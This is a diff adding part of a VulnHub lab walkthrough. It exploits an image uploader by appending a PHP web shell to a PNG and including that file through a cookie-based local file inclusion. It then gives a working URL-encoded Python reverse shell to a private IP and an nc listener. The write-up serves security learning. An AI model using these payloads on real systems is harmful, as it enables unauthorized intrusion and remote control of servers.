@@ -168,7 +168,68 @@ if(isset($_POST['submit'])) {
 ?>
 ```
 
+this code shows that only acceptable extension are those in `$whilelist` variable and then it md5 hash the basename (for example test.png) and upload it to `/upload` directory
 
+by inserting the php code in the last line of a png file, the uploader allows the file to be uploaded so i used the following code 
 
+```php
+<?php system($_GET["cmd"]) ?>
+```
+```text
+root@kali~# echo '<?php system($_GET["cmd"]) ?>' >> test.png
+```
+and uploaded it, in the `/upload` folder you will find the md5 hash of the file name :
+
+![hash](https://github.com/Git-K3rnel/VulnHub/assets/127470407/357e28e8-d616-4c98-a4f6-f9a3f7d09101)
+
+now we should find a way to execute the code, after spending some time i tried to get source code of the index.php using php filter , the php code of the page is :
+
+```php
+<?php
+//Multilingual. Not implemented yet.
+//setcookie("lang","en.lang.php");
+if (isset($_COOKIE['lang']))
+{
+	include("lang/".$_COOKIE['lang']);
+}
+// Not implemented yet.
+?>
+
+<?php
+	if (isset($_GET['page']))
+	{
+		include($_GET['page'].".php");
+	}
+	else
+	{
+		echo "Use this server to upload and share image files inside the intranet";
+	}
+?
+```
+
+yes, there is a `LFI` vulnerability in the cookie, so add the following cookie to your browser :
+
+```text
+lang=../upload/843eb8966ba95af4e3b673970ba8ebe8.png
+```
+you cand do it by browser storage section or console section by `document.cookie="lang=../upload/843eb8966ba95af4e3b673970ba8ebe8.png"`
+
+and the call the page with `cmd` parameter and a reverse shell, i used pytnhon reverse shell and url encoded it :
+
+```python
+python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.127.128%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)'
+```
+
+start a listener :
+
+```text
+root@kali~# nc -nvlp 4444
+```
+
+![revshell](https://github.com/Git-K3rnel/VulnHub/assets/127470407/3be2ce6e-280b-458d-8124-2cd8e24f14ab)
+
+and we get the shell :
+
+![revshell2](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f79411f2-5ab7-4e8c-9fe2-60124cf51c4d)
 
 
